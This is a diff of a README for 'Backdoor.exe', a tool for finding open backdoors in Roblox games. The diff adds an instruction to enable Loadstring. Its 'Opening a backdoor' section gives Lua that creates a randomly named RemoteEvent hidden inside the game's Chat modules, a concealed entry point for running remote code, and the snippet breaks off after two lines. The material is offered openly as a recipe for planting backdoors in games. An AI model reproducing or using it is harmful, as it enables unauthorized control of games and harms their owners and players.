@@ -1,6 +1,6 @@
 # Backdoor.exe
 The best backdoor scanner there is. Our [Discord Server](https://discord.com/invite/6HndYgC).
-YOU ARE NOT ALLOWED TO RESELL IT
+
 ## Credits
 * iK4oS
 * Bubba
@@ -12,6 +12,7 @@ Backdoor.exe is script that scans for open backdoors in games in [Roblox](https:
 
 ### Opening a backdoor
 Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
+Make sure to enable `Loadstring` in `ServerScriptServices`.
 ```lua
 local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
 Remote.Name = tostring(math.random(100000000,1000000000))
